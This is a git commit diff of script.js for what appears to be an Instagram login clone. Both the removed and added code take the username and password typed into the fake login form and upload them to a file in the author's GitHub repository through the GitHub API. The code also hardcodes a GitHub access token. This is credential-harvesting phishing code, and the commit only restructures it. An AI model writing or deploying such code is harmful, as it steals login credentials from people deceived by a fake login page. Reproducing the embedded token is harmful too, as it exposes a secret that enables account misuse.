daa579b0e84b2af8e919f53eb9429ea1733f551e
arnav <arnav4c@gmail.com>
2023-09-18 00:23:19 +0530

    change the script

--- script.js
+++ script.js
@@ -3,36 +3,44 @@ const password = document.querySelector('.password')
 
 
 document.querySelector('.loginButton').addEventListener('click', () => {
-    if (username.value ==='' || password.value ==='') {
-        console.log('empty');
-    }else {
-        console.log(username.value, password.value);
-        const owner = 'Arnav-lunatic'
-        const repo = 'insta-login-clone'
-        const path = 'info.txt'
-        const token = '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'
+  if (username.value ==='' || password.value ==='') {
+      console.log('empty');
+  }else {
+      console.log(username.value, password.value);
+      const repoOwner = 'Arnav-lunatic'
+      const repoName = 'info'
+      const filePath = 'info.txt'
+      const githubToken = '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'
+      const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`
 
-        let blob = new Blob([`username - "${username.value}" | password - "${password.value}"`],
-                { type: "text/plain" });
-        
-        const formData = new FormData();
-        formData.append("file", blob, path);
+      const newTextContent = `username - "${username.value}" | password - "${password.value}"`
 
-        fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`, {
-            method: "PUT",
+      const updateFile = async () => {
+        try {
+          const response = await fetch(apiUrl, {
+            method: 'PUT',
             headers: {
-                Authorization: `token ${token}`,
+              'Authorization': `token ${githubToken}`,
+              'Accept': 'application/vnd.github.v3+json',
             },
-            body: formData,
-        }).then((response) => {
-            if (response.status === 201 || response.status === 200) {
-              console.log("File written successfully:", response);
-            } else {
-              console.error("Error writing file:", response.statusText);
-            }
-          })
-          .catch((error) => {
-            console.error("Error writing file:", error);
+            body: JSON.stringify({
+              message: 'Update text file',
+              content: btoa(newTextContent), // Encode the new text content in base64
+              sha: '8b137891791fe96927ad78e64b0aad7bded08bdc', // You need to fetch the current SHA of the file first
+            }),
           });
-    }
+
+          if (response.status === 200) {
+            console.log('File updated successfully.');
+          } else {
+            console.error('Error updating file:', response.status, response.statusText);
+          }
+        } catch (error) {
+          console.error('Error updating file:', error);
+        }
+      };
+
+      // Call the function to update the file
+      updateFile();
+  }
 })
